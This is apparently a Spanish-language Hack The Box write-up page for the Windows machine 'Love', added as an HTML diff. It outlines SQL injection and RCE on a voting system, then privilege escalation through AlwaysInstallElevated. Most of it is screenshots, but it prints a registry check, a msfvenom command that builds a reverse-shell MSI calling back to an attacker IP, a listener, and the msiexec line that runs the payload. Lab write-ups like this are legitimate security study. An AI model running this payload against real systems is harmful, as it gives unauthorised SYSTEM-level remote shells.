@@ -1,0 +1,79 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | Love HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/windows.html">~/writeups/windows</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/love/pasted-20260316133512.png" alt="Love HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Windows</p>
+          <h1>Love</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>AlwaysInstallElevated</span>
+            <span>voting_system</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: Voting System expuesto en la web</li>
+            <li><code>Explotación</code>: SQLI sin autenticar y RCE autenticado con credenciales obtenidas</li>
+            <li><code>Escalada de Privilegios</code>: Política <code>AlwaysInstallElevated</code> para instalar MSI malicioso como SYSTEM</li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <img class="writeup-image" src="/writeups/assets/love/pasted-20260316154137.png" alt="Love HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación</h2>
+          <img class="writeup-image" src="/writeups/assets/love/pasted-20260316153851.png" alt="Love HTB" />
+          <img class="writeup-image" src="/writeups/assets/love/pasted-20260316155026.png" alt="Love HTB" />
+          <img class="writeup-image" src="/writeups/assets/love/pasted-20260316154225.png" alt="Love HTB" />
+          <img class="writeup-image" src="/writeups/assets/love/pasted-20260316153922.png" alt="Love HTB" />
+          <img class="writeup-image" src="/writeups/assets/love/pasted-20260316154056.png" alt="Love HTB" />
+          <img class="writeup-image" src="/writeups/assets/love/pasted-20260316154110.png" alt="Love HTB" />
+          <img class="writeup-image" src="/writeups/assets/love/pasted-20260316154932.png" alt="Love HTB" />
+          <img class="writeup-image" src="/writeups/assets/love/pasted-20260316154955.png" alt="Love HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios: Always Install Elevated</h2>
+          <div class="code-card">
+            <h3>Comprobar si es vulnerable</h3>
+            <pre><code>if((Get-ItemProperty HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer -ErrorAction SilentlyContinue).AlwaysInstallElevated -eq 1){echo "ES VULNERABLEbb!"}</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/love/pasted-20260316201249.png" alt="Love HTB" />
+          <div class="code-card">
+            <h3>Payload</h3>
+            <pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.69 LPORT=4443 -f msi -o rev.msi
+# Listener
+penelope -p 4443</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Ejecutar desde Windows rev.msi</h3>
+            <pre><code>msiexec /i rev.msi</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/love/pasted-20260316201531.png" alt="Love HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>AlwaysInstallElevated</span>
+            <span>voting_system</span>
+          </div>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
